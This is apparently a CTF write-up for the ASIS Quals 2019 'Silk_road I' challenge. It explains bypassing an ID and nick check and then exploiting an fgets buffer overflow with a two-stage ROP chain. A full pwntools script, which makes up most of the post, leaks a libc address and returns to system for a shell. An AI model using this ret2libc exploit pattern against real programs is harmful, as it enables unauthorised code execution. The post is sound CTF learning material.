---
title: Silk_road I (ASIS QUALS19)
date: 2019-04-24 00:00:00 +0530
categories: [CTF]
tags: [Re, exploitation, ctf]
---

### About the challenge :

The challenge was pretty simple. It was more of a reversing challenge than a pwning challenge.  Since it was a binary challenge, I started looking for bugs (I am a newbie in pwning ) and finally there is an `fgets()` function. But to reach the function we have a few constraints. First when we run a binary, it asks for an ID. There is a function which checks the ID. I didn’t want to sit and reverse the function, so brute-force worked. Then it asks for a nick and it was just a string compare.

Coming to the pwning part, after the overflow we just have to give a rop chain so that we can leak a libc address and then make it return to main again and give another rop chain so that we can execute `execve` system call.

The following is my script :

```python
from pwn import *
p = process('./silkroad.elf')
gdb.attach(p)
p.recvuntil("Enter your secret ID: ")
p.send("790317143")
p.recvuntil("Enter your nick: ")
p.send("DreadPirateRobertsCiz\x00")
p.recvuntil("delete evidince and run Silkroad!\n")
 
puts_got = p64(0x0000000000404038)
puts_plt = p64(0x0000000000401070)
main = p64(0x0000000000401AFD)
pop_rdi = p64(0x0000000000401bab)
 
exp1 = "a"*72 + pop_rdi + puts_got + puts_plt + main
 
p.sendline(exp1)
leak = u64(p.recvline().strip() + "\x00\x00")
print hex(leak)
system = leak - 202112
arg1 = leak + 1258714
print hex(system)
print hex(arg1)
 
p.recvuntil("Enter your secret ID: ")
p.send("790317143")
p.recvuntil("Enter your nick: ")
p.send("DreadPirateRobertsCiz\x00")
p.recvuntil("delete evidince and run Silkroad!\n")
 
exp2 = "a"*72 +  p64(0x401B4B) + pop_rdi + p64(arg1) + p64(system) + p64(0)
p.sendline(exp2)
 
p.interactive()
```

And that’s it, challenge solved !!!
